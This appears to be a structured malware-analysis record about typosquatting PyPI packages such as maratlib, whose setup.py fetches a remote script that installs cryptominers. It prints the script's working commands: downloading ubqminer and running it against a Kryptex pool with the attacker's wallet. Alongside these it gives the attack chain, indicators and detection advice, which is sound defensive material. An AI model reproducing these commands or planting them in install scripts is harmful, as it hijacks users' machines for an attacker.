package_info.package_name: maratlib (and related: maratlib1, matplatlib-plus, mllearnlib, mplatlib, learninglib)
package_info.package_versions: all published versions (April, by user nedog123)
package_info.why_malicious: These packages contain malicious code in their setup.py files that downloads and executes cryptomining scripts, hijacking developer workstations to mine cryptocurrency for the attacker. The packages use typosquatting to impersonate legitimate libraries and maximize downloads.

malicious_snippets.code_behavior: Downloads and executes a remote Bash script (aza2.sh) from the attacker's GitHub repository during package installation.

malice_analysis.why_suspicious: setup.py should not download and execute remote scripts from untrusted sources.
malice_analysis.violated_expectations: Normal setup.py scripts only handle package installation, not arbitrary code execution or remote script fetching.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies, but never execute arbitrary remote scripts.

malicious_snippets.code_snippet:
wget https://github.com/ubiq/ubqminer/releases/download/v0.17.0-alpha.1.ubqhash/ubqminer-0.17.0-alpha.1.ubqhash-cuda10.0-linux-x86_64.tar.gz
tar xzf ubqminer-0.17.0-alpha.1.ubqhash-cuda10.0-linux-x86_64.tar.gz
cd ubqminer-0.17.0-alpha.1.ubqhash-cuda10.0-linux-x86_64
chmod +x ubqminer && ./ubqminer -U stratum+tcp://0x510aec7f266557b7de753231820571b13eb31b57.v2d25ab852@ubq.kryptex.network:7000/v2d25ab852 --report-hashrate
malicious_snippets.code_behavior: Downloads, extracts, and runs the Ubqminer cryptominer, mining Ubiq cryptocurrency using the attacker's wallet address.

malice_analysis.why_suspicious: Cryptominer deployment is a classic sign of resource hijacking malware.
malice_analysis.violated_expectations: No legitimate package should install or run cryptominers on user systems.
malice_analysis.similar_legitimate_use: None; cryptominer installation is never legitimate in general-purpose packages.

execution_context.file_location: aza2.sh (alternate variant, downloaded from attacker's GitHub)

malice_analysis.why_suspicious: T-Rex miner is a well-known cryptomining tool, and its silent installation is a clear sign of malicious intent.
malice_analysis.violated_expectations: No legitimate package should install or run cryptominers on user systems.
malice_analysis.similar_legitimate_use: None; cryptominer installation is never legitimate in general-purpose packages.

attack_chain.action: User installs a malicious PyPI package (e.g., maratlib), triggering setup.py execution.
attack_chain.leads_to: Remote Bash script (aza2.sh) is downloaded and executed.

attack_chain.action: aza2.sh downloads and installs a cryptominer (Ubqminer or T-Rex) from a remote repository.
attack_chain.leads_to: Cryptominer is executed on the victim's machine.

attack_chain.action: Cryptominer connects to attacker's mining pool using attacker's wallet address, hijacking victim's resources for mining.
attack_chain.leads_to: Attacker receives mined cryptocurrency; victim's system performance is degraded.

behavioral_signatures: setup.py scripts that download and execute remote shell scripts
Installation-time network connections to GitHub or other code hosting sites
Silent installation and execution of cryptominer binaries
Outbound connections to known mining pools (Kryptex, NiceHash, etc.)
file_indicators: setup.py containing os.system or subprocess calls to wget/curl/bash
Temporary files or directories for cryptominer binaries (ubqminer, t-rex)
aza2.sh script downloaded and executed during install
detection_knowledge.how_to_detect: Monitor setup.py and other installation scripts for suspicious subprocess or os.system calls that fetch and execute remote scripts. Flag packages that download cryptominer binaries or connect to known mining pools. Use static analysis to detect typosquatting and unexpected network activity during package installation. Alert on any package that attempts to run shell scripts or binaries not required for normal operation.
